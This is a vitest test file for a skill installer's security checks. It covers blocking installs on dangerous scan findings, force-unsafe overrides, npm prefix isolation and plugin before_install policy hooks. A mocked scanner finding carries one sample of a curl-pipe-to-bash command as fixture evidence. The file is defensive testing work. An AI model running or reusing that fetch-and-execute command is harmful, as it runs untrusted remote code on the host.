import fs from "node:fs/promises";
import path from "node:path";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  initializeGlobalHookRunner,
  resetGlobalHookRunner,
} from "../plugins/hook-runner-global.js";
import { createMockPluginRegistry } from "../plugins/hooks.test-helpers.js";
import { captureEnv } from "../test-utils/env.js";
import { createFixtureSuite } from "../test-utils/fixture-suite.js";
import { installSkill, __testing as skillsInstallTesting } from "./skills-install.js";
import {
  runCommandWithTimeoutMock,
  scanDirectoryWithSummaryMock,
} from "./skills-install.test-mocks.js";
import { resolveOpenClawMetadata, resolveSkillInvocationPolicy } from "./skills/frontmatter.js";
import { loadSkillsFromDirSafe, readSkillFrontmatterSafe } from "./skills/local-loader.js";
import type { SkillEntry } from "./skills/types.js";

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/skill-scanner.js", () => ({
  scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
}));

vi.mock("./skills/plugin-skills.js", () => ({
  resolvePluginSkillDirs: () => [],
}));

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

function mockDangerousSkillScanFinding(skillDir: string) {
  scanDirectoryWithSummaryMock.mockResolvedValue({
    scannedFiles: 1,
    critical: 1,
    warn: 0,
    info: 0,
    findings: [
      {
        ruleId: "dangerous-exec",
        severity: "critical",
        file: path.join(skillDir, "runner.js"),
        line: 1,
        message: "Shell command execution detected (child_process)",
        evidence: 'exec("curl example.com | bash")',
      },
    ],
  });
}

function loadTestWorkspaceSkillEntries(workspaceDir: string): SkillEntry[] {
  const skills = loadSkillsFromDirSafe({
    dir: path.join(workspaceDir, "skills"),
    source: "openclaw-workspace",
  }).skills;
  return skills.map((skill) => {
    const frontmatter =
      readSkillFrontmatterSafe({
        rootDir: skill.baseDir,
        filePath: skill.filePath,
      }) ?? {};
    const invocation = resolveSkillInvocationPolicy(frontmatter);
    return {
      skill,
      frontmatter,
      metadata: resolveOpenClawMetadata(frontmatter),
      invocation,
      exposure: {
        includeInRuntimeRegistry: true,
        includeInAvailableSkillsPrompt: !invocation.disableModelInvocation,
        userInvocable: invocation.userInvocable,
      },
    };
  });
}

function lastRunCommandCall(): unknown[] | undefined {
  const calls = runCommandWithTimeoutMock.mock.calls;
  return calls[calls.length - 1];
}

const workspaceSuite = createFixtureSuite("openclaw-skills-install-");

beforeAll(async () => {
  await workspaceSuite.setup();
});

afterAll(async () => {
  resetGlobalHookRunner();
  skillsInstallTesting.setDepsForTest();
  await workspaceSuite.cleanup();
});

async function withWorkspaceCase(
  run: (params: { workspaceDir: string; stateDir: string }) => Promise<void>,
): Promise<void> {
  const workspaceDir = await workspaceSuite.createCaseDir("case");
  const stateDir = path.join(workspaceDir, "state");
  const envSnapshot = captureEnv(["OPENCLAW_STATE_DIR"]);
  try {
    process.env.OPENCLAW_STATE_DIR = stateDir;
    await run({ workspaceDir, stateDir });
  } finally {
    envSnapshot.restore();
  }
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    resetGlobalHookRunner();
    runCommandWithTimeoutMock.mockClear();
    scanDirectoryWithSummaryMock.mockClear();
    skillsInstallTesting.setDepsForTest({
      loadWorkspaceSkillEntries: loadTestWorkspaceSkillEntries,
      resolveNodeInstallStateDir: () => {
        const stateDir = process.env.OPENCLAW_STATE_DIR;
        if (!stateDir) {
          throw new Error("OPENCLAW_STATE_DIR missing in skills install test");
        }
        return stateDir;
      },
    });
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 1,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
  });

  it("blocks install when skill has dangerous code patterns", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      mockDangerousSkillScanFinding(skillDir);

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain('Skill "danger-skill" installation blocked');
      const warningOutput = (result.warnings ?? []).join("\n");
      expect(warningOutput).toContain("dangerous code patterns");
      expect(warningOutput).toContain("runner.js:1");
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });

  it("allows dangerous skill installs when forced unsafe install is set", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "forced-danger-skill");
      mockDangerousSkillScanFinding(skillDir);

      const result = await installSkill({
        workspaceDir,
        skillName: "forced-danger-skill",
        installId: "deps",
        dangerouslyForceUnsafeInstall: true,
      });

      expect(result.ok).toBe(true);
      expect(
        result.warnings?.some((warning) =>
          warning.includes(
            "forced despite dangerous code patterns via --dangerously-force-unsafe-install",
          ),
        ),
      ).toBe(true);
    });
  });

  it("runs npm node installs with an OpenClaw-managed user prefix", async () => {
    await withWorkspaceCase(async ({ workspaceDir, stateDir }) => {
      await writeInstallableSkill(workspaceDir, "node-prefix-skill");

      const result = await installSkill({
        workspaceDir,
        skillName: "node-prefix-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      const npmPrefix = path.join(stateDir, "tools", "node", "npm");
      const call = lastRunCommandCall();
      expect(call?.[0]).toEqual(["npm", "install", "-g", "--ignore-scripts", "example-package"]);
      const options = call?.[1] as { env?: NodeJS.ProcessEnv };
      expect(options.env?.NPM_CONFIG_PREFIX).toBe(npmPrefix);
      expect(options.env?.npm_config_prefix).toBe(npmPrefix);
      expect(options.env).not.toHaveProperty("PATH");
      const stat = await fs.stat(npmPrefix);
      expect(stat.isDirectory()).toBe(true);
    });
  });

  it("keeps the default npm prefix out of env-overridden state paths", () => {
    const envSnapshot = captureEnv(["OPENCLAW_STATE_DIR", "OPENCLAW_CONFIG_PATH"]);
    try {
      process.env.OPENCLAW_STATE_DIR = "/tmp/untrusted-state";
      process.env.OPENCLAW_CONFIG_PATH = "/tmp/untrusted-config/openclaw.json";

      expect(
        skillsInstallTesting.resolveDefaultNodeInstallStateDir({
          getuid: () => 501,
          homedir: () => "/Users/tester",
          platform: "darwin",
        }),
      ).toBe("/Users/tester/.openclaw");
    } finally {
      envSnapshot.restore();
    }
  });

  it("uses a fixed system state root for root npm installs", () => {
    expect(
      skillsInstallTesting.resolveDefaultNodeInstallStateDir({
        cwd: "/workspace/openclaw",
        getuid: () => 0,
        homedir: () => "/root",
        platform: "linux",
      }),
    ).toBe("/var/lib/openclaw");
  });

  it("blocks install when skill scan fails", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("code safety scan failed");
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });
  it("surfaces plugin scanner findings from before_install", async () => {
    const handler = vi.fn().mockReturnValue({
      findings: [
        {
          ruleId: "org-policy",
          severity: "warn",
          file: "policy.json",
          line: 1,
          message: "Organization policy requires manual review",
        },
      ],
    });
    initializeGlobalHookRunner(createMockPluginRegistry([{ hookName: "before_install", handler }]));

    await withWorkspaceCase(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "policy-skill");

      const result = await installSkill({
        workspaceDir,
        skillName: "policy-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(handler).toHaveBeenCalledTimes(1);
      const handlerCall = handler.mock.calls[0];
      const payload = handlerCall?.[0] as
        | {
            targetName?: string;
            targetType?: string;
            origin?: string;
            sourcePath?: string;
            sourcePathKind?: string;
            request?: { kind?: string; mode?: string };
            builtinScan?: { status?: string; findings?: unknown[] };
            skill?: {
              installId?: string;
              installSpec?: { kind?: string; package?: string };
            };
          }
        | undefined;
      expect(payload?.targetName).toBe("policy-skill");
      expect(payload?.targetType).toBe("skill");
      expect(payload?.origin).toBe("openclaw-workspace");
      expect(payload?.sourcePath).toContain("policy-skill");
      expect(payload?.sourcePathKind).toBe("directory");
      expect(payload?.request).toEqual({
        kind: "skill-install",
        mode: "install",
      });
      expect(payload?.builtinScan?.status).toBe("ok");
      expect(payload?.builtinScan?.findings).toEqual([]);
      expect(payload?.skill?.installId).toBe("deps");
      expect(payload?.skill?.installSpec?.kind).toBe("node");
      expect(payload?.skill?.installSpec?.package).toBe("example-package");
      expect(handlerCall?.[1]).toEqual({
        origin: "openclaw-workspace",
        targetType: "skill",
        requestKind: "skill-install",
      });
      expect(
        result.warnings?.some((warning) =>
          warning.includes(
            "Plugin scanner: Organization policy requires manual review (policy.json:1)",
          ),
        ),
      ).toBe(true);
    });
  });

  it("blocks install when before_install rejects the skill", async () => {
    const handler = vi.fn().mockReturnValue({
      block: true,
      blockReason: "Blocked by enterprise policy",
    });
    initializeGlobalHookRunner(createMockPluginRegistry([{ hookName: "before_install", handler }]));

    await withWorkspaceCase(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "blocked-skill");

      const result = await installSkill({
        workspaceDir,
        skillName: "blocked-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toBe("Blocked by enterprise policy");
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });

  it("keeps before_install hook blocks even when forced unsafe install is set", async () => {
    const handler = vi.fn().mockReturnValue({
      block: true,
      blockReason: "Blocked by enterprise policy",
    });
    initializeGlobalHookRunner(createMockPluginRegistry([{ hookName: "before_install", handler }]));

    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "forced-blocked-skill");
      mockDangerousSkillScanFinding(skillDir);

      const result = await installSkill({
        workspaceDir,
        skillName: "forced-blocked-skill",
        installId: "deps",
        dangerouslyForceUnsafeInstall: true,
      });

      expect(result.ok).toBe(false);
      expect(result.message).toBe("Blocked by enterprise policy");
      expect(
        result.warnings?.some((warning) =>
          warning.includes(
            "forced despite dangerous code patterns via --dangerously-force-unsafe-install",
          ),
        ),
      ).toBe(true);
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });
});
